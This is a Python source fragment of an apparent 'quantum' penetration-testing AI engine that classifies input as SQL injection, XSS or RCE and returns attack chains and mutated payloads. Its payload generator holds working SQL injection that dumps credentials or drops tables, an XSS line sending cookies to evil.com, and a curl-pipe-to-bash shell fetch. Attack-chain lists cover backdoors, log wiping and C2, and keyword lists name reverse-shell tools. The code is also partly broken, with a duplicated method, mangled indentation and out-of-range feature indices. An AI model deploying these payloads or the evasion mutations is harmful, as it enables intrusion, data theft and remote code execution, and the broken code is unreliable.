        # æ€§èƒ½ä¼˜åŒ–
        self.request_cache = {}
        self.performance_monitor = PerformanceMonitor()

        logger.info("ğŸš€ é¡¶çº§é‡å­æ¸—é€æµ‹è¯•AIå¼•æ“åˆå§‹åŒ–å®Œæˆ - ç»´åº¦ç»Ÿä¸€ä¸º256")

    def quantum_enhanced_analysis(self, text):
        """é‡å­å¢å¼ºæ¸—é€åˆ†æ - ä¸“ä¸šä¿®å¤ç‰ˆ"""
        start_time = time.time()

        try:
            # ==================== ä¸“ä¸šé¢„å¤„ç† ====================
            if not text:
                return self._fallback_analysis_advanced("", "æ— è¾“å…¥æ•°æ®")

            if isinstance(text, dict):
                text = text.get('text', '')
            else:
                text = str(text)

            if not text.strip():
                return self._fallback_analysis_advanced("", "ç©ºæ–‡æœ¬")

            processed_text = text
            text_length = len(processed_text)

            # æ™ºèƒ½ç¼“å­˜
            cache_key = f"quantum_{hash(processed_text)}"
            if cache_key in self.request_cache:
                return self.request_cache[cache_key]

            # ==================== é‡å­ç‰¹å¾æå– ====================
            features = self._extract_advanced_features(processed_text)
            if features is None:
                return self._fallback_analysis_advanced(processed_text, "ç‰¹å¾æå–å¤±è´¥")

            # åˆ›å»ºæ­£ç¡®çš„ç‰¹å¾å¼ é‡ï¼šä½¿ç”¨å‰128ç»´ç»™ä¸»æ¨¡å‹
            features_128 = features[:128]  # ä¸»æ¨¡å‹éœ€è¦128ç»´
            features_tensor = torch.FloatTensor(features_128).unsqueeze(0).to(self.device)

            # ==================== é‡å­ç¥ç»ç½‘ç»œåˆ†æ ====================
            with torch.no_grad():
                # ä¸»æ¨¡å‹åˆ†æï¼ˆä½¿ç”¨128ç»´ç‰¹å¾ï¼‰
                model_output = self.model(features_tensor)

                # ä»ä¸»æ¨¡å‹è¾“å‡ºè·å–æ”»å‡»æ½œåŠ›
                attack_potential = model_output['sql_injection_risk'].item()

                # ä½¿ç”¨é‡å­ç¼–ç å™¨å¤„ç†256ç»´ç‰¹å¾ï¼ˆå¦‚æœå¯ç”¨ï¼‰
                if hasattr(self, 'quantum_encoder') and len(features) >= 256:
                    try:
                        features_256_tensor = torch.FloatTensor(features).unsqueeze(0).to(self.device)
                        quantum_encoded = self.quantum_encoder(features_256_tensor)
                        # å¢å¼ºæ”»å‡»æ½œåŠ›è¯„åˆ†
                        quantum_boost = torch.sigmoid(quantum_encoded.mean()).item()
                        attack_potential = (attack_potential + quantum_boost) / 2.0
                    except Exception as quantum_error:
                        logger.warning("é‡å­ç¼–ç å™¨é”™è¯¯: %s", str(quantum_error))

            # ==================== æ”»å‡»ç±»å‹æ£€æµ‹ ====================
            attack_type_info = self._detect_attack_type_advanced(processed_text)

            # ==================== æ¸—é€æµ‹è¯•ä¸“ç”¨åŠŸèƒ½ ====================
            recommended_payloads = self._get_intelligent_payloads(attack_type_info, processed_text)
            attack_chain = self._generate_attack_chain_advanced(attack_type_info, attack_potential)
            risk_assessment = self._assess_risk_advanced(attack_potential, attack_type_info)
            threat_intel = self.threat_intel_engine.analyze(processed_text)

            # è®¡ç®—ç½®ä¿¡åº¦ï¼ˆä½¿ç”¨ä¸»æ¨¡å‹çš„å†³ç­–ç½®ä¿¡åº¦ï¼‰
            confidence_score = model_output[
                'decision_confidence'].item() if 'decision_confidence' in model_output else 0.7

            # ==================== ç”Ÿæˆä¸“ä¸šæŠ¥å‘Š ====================
            result = {
                'status': 'success',
                'attack_potential': round(attack_potential, 4),
                'exploitability_score': round(min(attack_potential * 1.8, 0.99), 4),
                'attack_type': attack_type_info,
                'attack_chain': attack_chain,
                'recommended_payloads': recommended_payloads,
                'risk_assessment': risk_assessment,
                'threat_intelligence': threat_intel,
                'confidence_score': confidence_score,
                'advanced_metrics': {
                    'feature_analysis': {
                        'sql_injection_score': float(features[200]) if len(features) > 200 else 0.0,
                        'xss_score': float(features[201]) if len(features) > 201 else 0.0,
                        'rce_score': float(features[202]) if len(features) > 202 else 0.0,
                        'context_score': float(features[220]) if len(features) > 220 else 0.0
                    },
                    'quantum_enhancement': 'active' if hasattr(self, 'quantum_encoder') else 'inactive'
                },
                'mode': 'enterprise_penetration_test',
                'timestamp': datetime.now().isoformat(),
                'performance_metrics': {
                    'processing_time_ms': round((time.time() - start_time) * 1000, 2),
                    'text_length': text_length,
                    'feature_dimensions': len(features),
                    'throughput': f"{int(1000 / ((time.time() - start_time) * 1000))} req/sec" if (
                                                                                                              time.time() - start_time) > 0 else "N/A"
                },
                'attack_context': {
                    'input_type': 'professional_payload',
                    'complexity_level': 'advanced' if text_length > 100 else 'basic',
                    'recommended_approach': self._get_attack_approach(attack_type_info, attack_potential)
                }
            }

            # ==================== æ€§èƒ½ç›‘æ§å’Œå­¦ä¹  ====================
            self.performance_monitor.record_request(result)

            # è®°å½•æ¸—é€ç»éªŒ
            penetration_experience = {
                'text': processed_text[:500] + '...' if len(processed_text) > 500 else processed_text,
                'attack_type': attack_type_info['primary'],
                'confidence': confidence_score,
                'potential': attack_potential,
                'timestamp': datetime.now().isoformat(),
                'success': attack_potential > 0.7
            }

            self.self_evolution_engine.record_experience(penetration_experience)
            self.neuroplastic_learner.experience_consolidation(penetration_experience)

            # ==================== æ™ºèƒ½ç¼“å­˜ ====================
            if attack_potential > 0.6:
                self.request_cache[cache_key] = result

            return result

        except Exception as e:
            logger.error("é‡å­æ¸—é€åˆ†æé”™è¯¯: %s", str(e), exc_info=True)
            return self._fallback_analysis_advanced(text, str(e))

    def _get_attack_approach(self, attack_type, attack_potential):
        """è·å–æ”»å‡»æ–¹æ³•å»ºè®®"""
        primary_type = attack_type.get('primary', 'unknown')

        approaches = {
            'sql_injection': [
                'UNIONæŸ¥è¯¢æ³¨å…¥', 'æŠ¥é”™æ³¨å…¥åˆ©ç”¨', 'æ—¶é—´ç›²æ³¨æ”»å‡»',
                'å¸ƒå°”ç›²æ³¨æ”»å‡»', 'å †å æŸ¥è¯¢æ³¨å…¥', 'äºŒæ¬¡æ³¨å…¥æ”»å‡»'
            ],
            'xss': [
                'åå°„å‹XSS', 'å­˜å‚¨å‹XSS', 'DOMå‹XSS',
                'åŸºäºFlashçš„XSS', 'mXSSæ”»å‡»', 'UXSSæ”»å‡»'
            ],
            'rce': [
                'å‘½ä»¤æ³¨å…¥', 'ä»£ç æ‰§è¡Œ', 'ååºåˆ—åŒ–æ”»å‡»',
                'æ¨¡æ¿æ³¨å…¥', 'å†…å­˜ç ´ååˆ©ç”¨', 'è¿œç¨‹ä»£ç æ‰§è¡Œ'
            ]
        }

        return approaches.get(primary_type, ['ç»¼åˆæ¸—é€æµ‹è¯•', 'å¤šå‘é‡æ”»å‡»'])[:3]

    def _get_attack_approach(self, attack_type, attack_potential):
        """è·å–ä¸“ä¸šæ”»å‡»æ–¹æ³•å»ºè®®"""
        primary_type = attack_type.get('primary', 'unknown')
        confidence = attack_type.get('confidence', 0.0)

        approaches = {
            'sql_injection': {
                'low': ['åŸºç¡€å¸ƒå°”ç›²æ³¨', 'é”™è¯¯æ³¨å…¥æ¢æµ‹', 'æ—¶é—´ç›²æ³¨æµ‹è¯•'],
                'medium': ['UNIONæŸ¥è¯¢æ³¨å…¥', 'æŠ¥é”™æ³¨å…¥åˆ©ç”¨', 'å †å æŸ¥è¯¢æ”»å‡»'],
                'high': ['äºŒé˜¶SQLæ³¨å…¥', 'å­˜å‚¨è¿‡ç¨‹æ³¨å…¥', 'ORMç»•è¿‡æ”»å‡»', 'NoSQLæ³¨å…¥']
            },
            'xss': {
                'low': ['åå°„å‹XSSæµ‹è¯•', 'DOMåŸºç¡€æµ‹è¯•'],
                                                    'medium': ['å­˜å‚¨å‹XSS', 'DOMå‹é«˜çº§åˆ©ç”¨', 'åŸºäºFlashçš„XSS'],
        'high': ['ç›²æ‰“XSS', 'ç»„åˆå‹XSS', 'åŸºäºSVGçš„XSS', 'Content-Security-Policyç»•è¿‡']
        },
        'rce': {
            'low': ['å‘½ä»¤æ³¨å…¥æµ‹è¯•', 'ä»£ç æ‰§è¡Œæ¢æµ‹'],
            'medium': ['è¿œç¨‹ä»£ç æ‰§è¡Œ', 'ååºåˆ—åŒ–æ”»å‡»', 'æ¨¡æ¿æ³¨å…¥'],
            'high': ['å†…å­˜ç ´ååˆ©ç”¨', 'å†…æ ¸æ¼æ´åˆ©ç”¨', 'é›¶æ—¥æ¼æ´æ”»å‡»', 'æŒä¹…åŒ–åé—¨']
        }
        }

        # ç¡®å®šæ”»å‡»çº§åˆ«
        if attack_potential > 0.8 and confidence > 0.7:
            level = 'high'
        elif attack_potential > 0.5 and confidence > 0.4:
            level = 'medium'
        else:
            level = 'low'

        return approaches.get(primary_type, {}).get(level, ['ç»¼åˆæ¸—é€æµ‹è¯•', 'å¤šå‘é‡æ”»å‡»'])

    def _extract_advanced_features(self, text):
        """å¢å¼ºçš„ç‰¹å¾æå– - æ— é•¿åº¦é™åˆ¶"""
        base_features = self._extract_features(text)
        advanced_features = np.zeros(256, dtype=np.float32)
        advanced_features[:128] = base_features

        if not text:
            return advanced_features

        text_lower = text.lower()
        
        # å¢åŠ å¯¹é•¿æ–‡æœ¬çš„ç‰¹æ®Šå¤„ç†
        text_length = len(text)
        if text_length > 1000:
            # å¯¹é•¿æ–‡æœ¬è¿›è¡Œé‡‡æ ·åˆ†æï¼Œè€Œä¸æ˜¯å…¨æ–‡æœ¬åˆ†æ
            sample_text = text[:500] + text[-500:]  # å–é¦–å°¾å„500å­—ç¬¦
            text_lower = sample_text.lower()
            advanced_features[230] = 1.0  # æ ‡è®°ä¸ºé•¿æ–‡æœ¬
        else:
            advanced_features[230] = 0.0

        # ==================== SQLæ³¨å…¥ç‰¹å¾æ£€æµ‹ ====================
        sql_patterns = [
            'union select', 'select from', 'insert into', 'update set',
            'delete from', 'drop table', 'exec(', 'xp_', 'waitfor delay',
            'benchmark(', 'sleep(', 'extractvalue', 'updatexml', 'load_file',
            'information_schema', 'version()', 'user()', 'database()', '@@version'
        ]

        for i, pattern in enumerate(sql_patterns, 128):
            if pattern in text_lower and i < 256:
                advanced_features[i] = 1.0
                advanced_features[200] += 0.1  # SQLæ³¨å…¥ç½®ä¿¡åº¦

        # ==================== XSSç‰¹å¾ ====================
        xss_patterns = [
            '<script', 'javascript:', 'onerror=', 'onload=',
            'alert(', 'document.cookie', 'eval(', 'innerhtml'
        ]

        for i, pattern in enumerate(xss_patterns, 150):
            if pattern in text_lower and i < 256:
                advanced_features[i] = 1.0
                advanced_features[201] += 0.1

        # ==================== RCEç‰¹å¾ ====================
        rce_patterns = ['system(', 'exec(', 'passthru(', 'shell_exec(', '|', ';', '`']
        for i, pattern in enumerate(rce_patterns, 170):
            if pattern in text_lower and i < 256:
                advanced_features[i] = 1.0
                advanced_features[202] += 0.1

        # ==================== æ–°å¢ä¸“ä¸šç‰¹å¾æ£€æµ‹ ====================
        current_index = 190  # ä»190å¼€å§‹ï¼Œç¡®ä¿ä¸å†²çª

        # NoSQLæ³¨å…¥ç‰¹å¾
        nosql_patterns = ['$where', '$ne', '$regex', '$gt', '$or', 'mongodb']
        for pattern in nosql_patterns:
            if current_index < 256:
                advanced_features[current_index] = 1.0 if pattern in text_lower else 0.0
                current_index += 1

        # SSTIæ¨¡æ¿æ³¨å…¥ç‰¹å¾
        ssti_patterns = ['{{', '}}', '__class__', '__mro__', '__subclasses__', 'config.items']
        for pattern in ssti_patterns:
            if current_index < 256:
                advanced_features[current_index] = 1.0 if pattern in text_lower else 0.0
                current_index += 1

        # XXEç‰¹å¾
        xxe_patterns = ['<!DOCTYPE', '<!ENTITY', 'SYSTEM', 'file://', 'http://']
        for pattern in xxe_patterns:
            if current_index < 256:
                advanced_features[current_index] = 1.0 if pattern in text_lower else 0.0
                current_index += 1

        # Headeræ³¨å…¥ç‰¹å¾
        header_patterns = ['host:', 'x-forwarded', 'location:', 'refresh:']
        for pattern in header_patterns:
            if current_index < 256:
                advanced_features[current_index] = 1.0 if pattern in text_lower else 0.0
                current_index += 1

        return advanced_features

    def _detect_attack_type_advanced(self, text):
        """é¡¶çº§æ”»å‡»ç±»å‹æ£€æµ‹ - 256ç»´ç‰ˆæœ¬"""
        if not text or not isinstance(text, str):
            return {'primary': 'unknown', 'confidence': 0.1}

        text_lower = text.lower()
        scores = {'sql_injection': 0.0, 'xss': 0.0, 'rce': 0.0}

        # ==================== SQLæ³¨å…¥æ£€æµ‹ ====================
        sql_keywords = [
            'union', 'select', 'from', 'where', 'insert', 'update', 'delete',
            'drop', 'exec', 'xp_', 'waitfor', 'benchmark', 'sleep', 'extractvalue',
            'updatexml', 'information_schema', 'version()', 'user()', 'database()',
            'concat', 'hex', 'ascii', 'substr', 'length', 'order by', 'group by'
        ]

        sql_keyword_count = sum(1 for kw in sql_keywords if kw in text_lower)
        base_sql_score = min(sql_keyword_count * 0.08, 0.7)

        # ç‰¹æ®Šå­—ç¬¦åŠ æˆ
        special_bonus = 0.0
        if any(char in text_lower for char in ["'", "--", "/*", "#"]):
            special_bonus += 0.2
        if text_lower.count("'") >= 2:
            special_bonus += 0.15

        scores['sql_injection'] = min(base_sql_score + special_bonus, 0.9)

        # ==================== XSSæ£€æµ‹ ====================
        xss_keywords = [
            'script', 'javascript', 'onerror', 'onload', 'alert',
            'document.cookie', 'eval', 'innerhtml', 'fromcharcode'
        ]
        xss_keyword_count = sum(1 for kw in xss_keywords if kw in text_lower)
        scores['xss'] = min(xss_keyword_count * 0.15, 0.85)

        # ==================== RCEæ£€æµ‹ ====================
        rce_keywords = [
            'system', 'exec', 'passthru', 'shell', 'popen', 'proc_open',
            'whoami', 'ls', 'cat', 'chmod', 'wget', 'curl', 'nc', 'python',
            'bash', 'sh', 'perl', 'ruby', 'php', 'java', 'node', 'powershell',
            'import', 'socket', 'os', 'subprocess', 'pty', 'reverse', 'bind',
            'meterpreter', 'exploit', 'payload', 'bin/sh', 'bin/bash',
            'nc -e', 'nc -lvp', 'telnet', 'ssh', 'ftp', 'nmap', 'tcpdump',
            'sqlmap', 'metasploit', 'burpsuite', 'nessus', 'hydra', 'john'
        ]

        rce_keyword_count = sum(1 for kw in rce_keywords if kw in text_lower)
        base_rce_score = min(rce_keyword_count * 0.12, 0.8)

        # é«˜çº§RCEæ¨¡å¼åŠ æˆ
        advanced_rce_bonus = 0.0
        if any(pattern in text_lower for pattern in ['import socket', 'import os', 'subprocess.']):
            advanced_rce_bonus += 0.25
        if any(pattern in text_lower for pattern in ['reverse shell', 'bind shell', 'meterpreter']):
            advanced_rce_bonus += 0.20

        scores['rce'] = min(base_rce_score + advanced_rce_bonus, 0.95)

        # ==================== ç¡®å®šä¸»è¦æ”»å‡»ç±»å‹ ====================
        primary_type, max_score = max(scores.items(), key=lambda x: x[1])

        # ä¸“ä¸šçº§ç½®ä¿¡åº¦å¢å¼º
        confidence_boost = 0.0
        if primary_type == 'rce' and rce_keyword_count >= 3:
            confidence_boost = min(rce_keyword_count * 0.08, 0.3)
            if any(x in text_lower for x in ['import socket', 'subprocess', 'pty.spawn']):
                confidence_boost += 0.15
            if any(x in text_lower for x in ['reverse shell', 'meterpreter']):
                confidence_boost += 0.12

        final_confidence = min(max_score + confidence_boost, 0.98)

        return {
            'primary': primary_type,
            'confidence': round(final_confidence, 4),
            'all_scores': {k: round(v, 4) for k, v in scores.items()}
        }

    def _generate_attack_chain_advanced(self, attack_type, attack_potential):
        """ç”Ÿæˆé«˜çº§æ”»å‡»é“¾ - åŒ…å«æ¸—é€æ­¥éª¤"""
        primary_type = attack_type.get('primary', 'unknown')
        confidence = attack_type.get('confidence', 0.0)

        attack_chains = {
            'sql_injection': {
                'reconnaissance': [
                    'æ•°æ®åº“æŒ‡çº¹è¯†åˆ«', 'SQLæ–¹è¨€æ£€æµ‹', 'æ³¨å…¥ç‚¹æšä¸¾',
                    'å‚æ•°æ¨¡ç³Šæµ‹è¯•', 'é”™è¯¯ä¿¡æ¯åˆ†æ', 'å“åº”æ—¶é—´ç›‘æµ‹'
                ],
                'weaponization': [
                    'UNIONæŸ¥è¯¢æ„é€ ', 'æŠ¥é”™æ³¨å…¥payloadç”Ÿæˆ', 'æ—¶é—´ç›²æ³¨è„šæœ¬å¼€å‘',
                    'å¸ƒå°”ç›²æ³¨æ¡ä»¶è®¾è®¡', 'äºŒé˜¶æ³¨å…¥å‡†å¤‡', 'ORMç»•è¿‡æŠ€å·§'
                ],
                'exploitation': [
                    'æ•°æ®æå–: è¡¨å/åˆ—åæšä¸¾', 'æ•æ„Ÿæ•°æ®è¯»å–', 'æƒé™æå‡å°è¯•',
                    'æ–‡ä»¶ç³»ç»Ÿè®¿é—®', 'æ“ä½œç³»ç»Ÿå‘½ä»¤æ‰§è¡Œ', 'æ•°æ®åº“ææƒ'
                ],
                'post_exploitation': [
                    'æŒä¹…åŒ–è®¿é—®å»ºç«‹', 'æ•°æ®å¯¼å‡ºåŠ å¯†', 'æ—¥å¿—æ¸…ç†',
                    'æ¨ªå‘ç§»åŠ¨å‡†å¤‡', 'åé—¨éƒ¨ç½²', 'ç—•è¿¹æ©ç›–'
                ]
            },
            'xss': {
                'reconnaissance': [
                    'è¾“å…¥ç‚¹å‘ç°', 'è¿‡æ»¤å™¨æ£€æµ‹', 'ä¸Šä¸‹æ–‡åˆ†æ',
                    'DOMç»“æ„æ¢æŸ¥', 'äº‹ä»¶å¤„ç†å™¨æšä¸¾', 'CSPç­–ç•¥åˆ†æ'
                ],
                'weaponization': [
                    'å¤šç§ç¼–ç ç»•è¿‡', 'äº‹ä»¶å¤„ç†å™¨åˆ©ç”¨', 'DOMæ±¡æŸ“payload',
                    'å­˜å‚¨å‹XSSæ„é€ ', 'ç›²æ‰“å¹³å°é›†æˆ', 'CSPç»•è¿‡æŠ€å·§'
                ],
                'exploitation': [
                    'ä¼šè¯åŠ«æŒ', 'cookieçªƒå–', 'é”®ç›˜è®°å½•',
                    'é’“é±¼æ”»å‡»', 'é‡å®šå‘æ”»å‡»', 'å®¢æˆ·ç«¯æ¼æ´åˆ©ç”¨'
                ],
                'post_exploitation': [
                    'æŒä¹…åŒ–è„šæœ¬éƒ¨ç½²', 'æ°´å‘æ”»å‡»å‡†å¤‡', 'ç¤¾ä¼šå·¥ç¨‹å­¦åˆ©ç”¨',
                    'æ¨ªå‘æ¸—é€', 'æ•°æ®æ¸—æ¼', 'ç—•è¿¹æ¸…é™¤'
                ]
            },
            'rce': {
                'reconnaissance': [
                    'å‘½ä»¤æ³¨å…¥ç‚¹å‘ç°', 'ä»£ç æ‰§è¡Œæ¼æ´æ£€æµ‹', 'ååºåˆ—åŒ–ç‚¹è¯†åˆ«',
                    'æ¨¡æ¿æ³¨å…¥åˆ†æ', 'ç³»ç»Ÿå‘½ä»¤è¿‡æ»¤æµ‹è¯•', 'æƒé™ä¸Šä¸‹æ–‡æ¢æŸ¥'
                ],
                'weaponization': [
                    'å¤šå¹³å°payloadç”Ÿæˆ', 'ç¼–ç æ··æ·†ç»•è¿‡', 'å†…å­˜å…æ€å¤„ç†',
                    'æŒä¹…åŒ–æœºåˆ¶è®¾è®¡', 'C2é€šä¿¡åŠ å¯†', 'åæ£€æµ‹æŠ€æœ¯åº”ç”¨'
                ],
                'exploitation': [
                    'åå‘shellå»ºç«‹', 'æƒé™æå‡æ”»å‡»', 'ç³»ç»Ÿä¿¡æ¯æ”¶é›†',
                    'å†…ç½‘æ¨ªå‘ç§»åŠ¨', 'å‡­è¯çªƒå–', 'å…³é”®æ•°æ®å®šä½'
                ],
                'post_exploitation': [
                    'æŒä¹…åŒ–åé—¨å®‰è£…', 'ç½‘ç»œéš§é“å»ºç«‹', 'æ•°æ®æ‰“åŒ…åŠ å¯†',
                    'æ¨ªå‘æ‰©å±•æ”»å‡»', 'ç—•è¿¹æ¸…é™¤è¦†ç›–', 'æ”»å‡»æŠ¥å‘Šç”Ÿæˆ'
                ]
            }
        }

        return attack_chains.get(primary_type, {
            'reconnaissance': ['åŸºç¡€ä¾¦å¯Ÿ', 'ç›®æ ‡åˆ†æ', 'æ¼æ´æ‰«æ'],
            'exploitation': ['æ¼æ´åˆ©ç”¨', 'æƒé™è·å–', 'è®¿é—®å»ºç«‹']
        })

    def _get_intelligent_payloads(self, attack_type, context):
        """ä¿®å¤çš„ä¸“ä¸šçº§æ™ºèƒ½payloadç”Ÿæˆ - å¤æ‚å˜å¼‚ç‰ˆ"""
        primary_type = attack_type.get('primary', 'unknown')
        confidence = attack_type.get('confidence', 0.0)
        context_lower = context.lower() if context else ""

        # æ ¹æ®æ”»å‡»ç±»å‹é€‰æ‹©payload - ç¡®ä¿åŸºç¡€payloadæ€»æ˜¯è¿”å›
        payloads = []

        if primary_type == 'sql_injection':
            # ==================== åŸºç¡€payloadç§å­ ====================
            base_payloads = [
                # UNIONæ³¨å…¥
                "UNION SELECT NULL,version(),user()",
                "UNION SELECT NULL,table_name,NULL FROM information_schema.tables",
                "UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'",
                "UNION SELECT NULL,CONCAT(username,0x3a,password),NULL FROM users",

                # æŠ¥é”™æ³¨å…¥
                "AND EXTRACTVALUE(1,CONCAT(0x7e,version(),0x7e))",
                "AND UPDATEXML(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables),0x7e),1)",

                # æ—¶é—´ç›²æ³¨
                "AND IF(ASCII(SUBSTR(version(),1,1))=53,SLEEP(2),0)",
                "OR (SELECT * FROM (SELECT(SLEEP(2)))a)",

                # å¸ƒå°”ç›²æ³¨
                "AND ASCII(SUBSTR((SELECT password FROM users LIMIT 1),1,1))>50",
                "AND LENGTH((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables))>10",

                # å †å æŸ¥è¯¢
                "; DROP TABLE users",
                "; CREATE TABLE hacked(data TEXT)"
            ]

            # ==================== å¤æ‚å˜å¼‚å¼•æ“ ====================
            for base in base_payloads:
                # å¤šé‡å˜å¼‚
                variants = []

                # 1. åŸºç¡€ç‰ˆæœ¬
                variants.append(base)

                # 2. URLç¼–ç ç‰ˆæœ¬
                url_encoded = base.replace(" ", "%20").replace("'", "%27")
                variants.append(url_encoded)

                # 3. æ³¨é‡Šæ··æ·†ç‰ˆæœ¬
                commented = base.replace(" ", "/**/").replace("SELECT", "SEL/*1234*/ECT")
                variants.append(commented)

                # 4. å¤§å°å†™å˜å¼‚ç‰ˆæœ¬
                import random
                random_case = ''.join(
                    char.upper() if self.random.random() > 0.5 else char.lower()
                    for char in base
                )
                variants.append(random_case)

                # 5. è¯­æ³•å˜å½¢ç‰ˆæœ¬
                syntax_variant = base.replace("=", " LIKE ").replace("OR", "||")
                variants.append(syntax_variant)

                payloads.extend(variants)

        elif primary_type == 'xss':
            base_payloads = [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "javascript:alert('XSS')",
                "<script>fetch('http://evil.com/steal?cookie='+document.cookie)</script>"
            ]

            for base in base_payloads:
                variants = [
                    base,
                    base.replace("<", "&lt;").replace(">", "&gt;"),
                    base.upper(),
                    base.replace("alert", "al" + "ert")
                ]
                payloads.extend(variants)

        elif primary_type == 'rce':
            base_payloads = [
                "; whoami",
                "| id",
                "`id`",
                "$(id)",
                "| curl http://evil.com/shell.sh | bash"
            ]

            for base in base_payloads:
                variants = [
                    base,
                    base.replace(" ", "/**/"),
                    base.replace("whoami", "w" + "hoami"),
                    base.upper()
                ]
                payloads.extend(variants)

        elif primary_type == 'lfi_rfi':
            base_payloads = [
                "../../../../etc/passwd",
                "....//....//....//....//etc/passwd",
                "php://filter/convert.base64-encode/resource=index.php"
            ]

            for base in base_payloads:
                variants = [
                    base,
                    base.replace("../", "..%2f"),
                    base.replace("/", "%2f"),
                    base + "?bypass=1"
                ]
                payloads.extend(variants)

        else:
            # é»˜è®¤SQLæ³¨å…¥payload
            base_payloads = [
                "OR 1=1",
                "UNION SELECT NULL,version(),user()",
                "AND (SELECT COUNT(*) FROM users)>0"
            ]

            for base in base_payloads:
                variants = [
                    base,
                    base.replace(" ", "/**/"),
                    base.replace("=", " LIKE "),
                    base.upper()
                ]
                payloads.extend(variants)

        # ==================== æ™ºèƒ½ä¸Šä¸‹æ–‡é€‚é… ====================
        optimized_payloads = []

        for payload in payloads:
            optimized = payload

            # æ·»åŠ å¼•å·å‰ç¼€
            if not payload.startswith(("'", '"', ";", "|", "`", "$")):
                optimized = "'" + optimized

            # æ·»åŠ ç»ˆæ­¢ç¬¦
            if not any(end in optimized for end in ["--", "#", "/*"]):
                optimized += "--"

            # é¢å¤–ç¼–ç å˜å¼‚
            if self.random.random() > 0.7:
                optimized = optimized.replace(" ", "/**/")

            optimized_payloads.append(optimized)

        # å»é‡å¹¶ç¡®ä¿è¶³å¤Ÿçš„æ•°é‡
        unique_payloads = []
        seen = set()

        for payload in optimized_payloads:
            if payload not in seen:
                seen.add(payload)
                unique_payloads.append(payload)

        # å¦‚æœæ•°é‡ä¸è¶³ï¼Œè¡¥å……åŸºç¡€payload
        if len(unique_payloads) < 8:
            fallbacks = [
                "' OR 1=1--",
                "' UNION SELECT NULL,version(),user()--",
                "' AND (SELECT COUNT(*) FROM users)>0--",
                "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--"
            ]
            unique_payloads.extend(fallbacks)

        return unique_payloads[:15]  # è¿”å›æœ€å¤š15ä¸ªå˜å¼‚payload

    def _optimize_payload(self, payload, context, attack_type):
        """ä¼˜åŒ–payload"""
        if attack_type == 'sql_injection':
            # SQLæ³¨å…¥ä¼˜åŒ–
            if 'union' in payload.lower() and 'select' in context:
                if 'null' not in payload:
                    return payload.replace('SELECT', 'SELECT null,null,null')

            if 'sleep' in payload.lower():
                return payload.replace('SLEEP(5)', 'SLEEP(2)')

        return payload

    def _assess_risk_advanced(self, attack_score, attack_type):
        """ä¿®å¤çš„é«˜çº§é£é™©è¯„ä¼°"""
        # è°ƒæ•´é£é™©ç­‰çº§é˜ˆå€¼ï¼Œè®©è¯„åˆ†æ›´åˆç†
        risk_levels = {
            'critical': {'min': 0.75, 'actions': ['ç«‹å³é˜»æ–­', 'ç´§æ€¥å“åº”', 'æ·±åº¦åˆ†æ']},
            'high': {'min': 0.6, 'actions': ['ç§¯ææµ‹è¯•', 'ä¼˜å…ˆå¤„ç†', 'åŠ å¼ºç›‘æ§']},
            'medium': {'min': 0.4, 'actions': ['è°¨æ…æ¢æµ‹', 'è®¡åˆ’æµ‹è¯•', 'éªŒè¯æ¼æ´']},
            'low': {'min': 0.0, 'actions': ['ç›‘æ§è§‚å¯Ÿ', 'åŸºç¡€æ‰«æ']}
        }

        # ç¡®å®šé£é™©ç­‰çº§
        risk_level = 'low'
        for level, criteria in risk_levels.items():
            if attack_score >= criteria['min']:
                risk_level = level

        # æ ¹æ®æ”»å‡»ç±»å‹è°ƒæ•´ä¸šåŠ¡å½±å“
        primary_type = attack_type.get('primary', 'unknown')
        business_impact = self._estimate_business_impact(attack_type)

        # å¦‚æœåˆ†æ•°é«˜ä½†ç­‰çº§ä½ï¼Œè‡ªåŠ¨æå‡ç­‰çº§
        if attack_score > 0.65 and risk_level == 'low':
            risk_level = 'medium'
        elif attack_score > 0.75 and risk_level == 'medium':
            risk_level = 'high'

        return {
            'level': risk_level,
            'score': round(attack_score, 4),
            'recommended_actions': risk_levels[risk_level]['actions'],
            'exploitation_difficulty': self._calculate_difficulty(attack_score),
            'business_impact': business_impact
        }

    def _calculate_difficulty(self, attack_score):
        """ä¿®å¤çš„åˆ©ç”¨éš¾åº¦è®¡ç®—"""
        if attack_score > 0.8:
            return "ä½ (å®¹æ˜“åˆ©ç”¨)"
        elif attack_score > 0.6:
            return "ä¸­ç­‰"
        elif attack_score > 0.4:
            return "è¾ƒé«˜"
        else:
            return "é«˜ (éš¾ä»¥åˆ©ç”¨)"

    def _estimate_business_impact(self, attack_type):
        """ä¿®å¤çš„ä¸šåŠ¡å½±å“è¯„ä¼°"""
        primary_type = attack_type.get('primary', 'unknown')
        confidence = attack_type.get('confidence', 0.0)

        impact_levels = {
            'sql_injection': "é«˜ - å¯èƒ½å¯¼è‡´æ•°æ®æ³„éœ²ã€æ•°æ®ç¯¡æ”¹ã€ç³»ç»Ÿæ²¦é™·",
            'xss': "ä¸­é«˜ - å¯èƒ½çªƒå–ç”¨æˆ·ä¼šè¯ã€é’“é±¼æ”»å‡»ã€å®¢æˆ·ç«¯æ”»å‡»",
            'rce': "æé«˜ - å¯èƒ½å¯¼è‡´ç³»ç»Ÿå®Œå…¨æ²¦é™·ã€æƒé™æå‡",
            'lfi_rfi': "ä¸­ - å¯èƒ½è¯»å–æ•æ„Ÿæ–‡ä»¶ã€è¿œç¨‹ä»£ç æ‰§è¡Œ",
            'ssrf': "é«˜ - å¯èƒ½è®¿é—®å†…ç½‘æœåŠ¡ã€äº‘å…ƒæ•°æ®æ³„éœ²",
            'default': "å¾…è¯„ä¼° - éœ€è¦è¿›ä¸€æ­¥åˆ†æ"
        }

        impact = impact_levels.get(primary_type, impact_levels['default'])

        # æ ¹æ®ç½®ä¿¡åº¦è°ƒæ•´å½±å“æè¿°
        if confidence > 0.7:
            impact = impact.replace("å¯èƒ½", "æå¯èƒ½")
        elif confidence > 0.5:
            impact = impact.replace("å¯èƒ½", "å¾ˆå¯èƒ½")

        return impact

    def _calculate_confidence_score(self, features, attack_score):
        """é‡å­çº§ç½®ä¿¡åº¦è®¡ç®— - å¤šç»´åº¦èåˆ"""
        # æå–å¤šä¸ªç½®ä¿¡åº¦ç‰¹å¾
        sql_confidence = features[500] if len(features) > 500 else 0.0
        xss_confidence = features[501] if len(features) > 501 else 0.0
        rce_confidence = features[502] if len(features) > 502 else 0.0
        overall_confidence = features[503] if len(features) > 503 else 0.0

